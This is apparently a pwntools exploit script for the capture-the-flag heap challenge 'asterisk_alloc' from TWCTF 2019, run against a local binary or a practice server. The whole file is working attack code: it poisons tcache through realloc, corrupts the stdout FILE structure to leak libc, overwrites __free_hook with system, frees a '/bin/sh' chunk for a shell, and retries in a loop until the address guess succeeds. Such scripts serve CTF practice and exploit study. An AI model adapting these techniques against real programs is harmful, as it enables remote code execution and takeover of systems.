import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	try :
		if len(sys.argv)==1 :
			io=process('./TWCTF_online_2019_asterisk_alloc')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./TWCTF_online_2019_asterisk_alloc')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28571)
			elf=ELF('./TWCTF_online_2019_asterisk_alloc')
			libc=ELF('../../x64libc/libc.so.6')

		def add_m(a,b):
			io.sendlineafter('Your choice: ','1')
			io.sendlineafter('Size: ',str(a))
			io.sendafter('Data: ',b)

		def add_r(a,b):
			io.sendlineafter('Your choice: ','3')
			io.sendlineafter('Size: ',str(a))
			io.sendafter('Data: ',b)

		def add_c(a,b):
			io.sendlineafter('Your choice: ','2')
			io.sendlineafter('Size: ',str(a))
			io.sendafter('Data: ',b)

		def delete(a):
			io.sendlineafter('Your choice: ','4')
			io.sendlineafter(':',a)

		add_r(0x70,'a')
		add_r(0,'0')
		add_r(0x300,'0')
		add_r(0,'0')
		add_r(0x60,'1')
		add_r(0,'')
		add_r(0x300,'1')
		for i in range(7):
			delete('r')

		add_r(0,'')
		add_r(0x70,'a')
		add_r(0x380,'\x00'*0x78+p64(0x61)+'\x60\xa7')
		add_r(0,'')
		add_r(0x300,'aaa')
		add_r(0,'')
		add_m(0x300,p64(0xfbad1800)+p64(0)*3+'\xc8')
		libc_base=u64(io.recv(8))-libc.sym['_IO_2_1_stdin_']
		if '====' in p64(libc_base):
			io.close()
			continue
		libc.address=libc_base
		add_r(0x380,'\x00'*0x78+p64(0x311)+p64(libc.sym['__free_hook']))
		add_r(0,'')
		add_r(0x50,p64(libc.sym['system']))
		add_r(0,'')
		add_r(0x50,p64(libc.sym['system']))
		add_c(0x600,'/bin/sh')
		delete('c')





		

		success('libc_base:'+hex(libc_base))
		#gdb.attach(io)
		#pause()
		io.interactive()

	except Exception as e:
		io.close()
		continue
	else:
		continue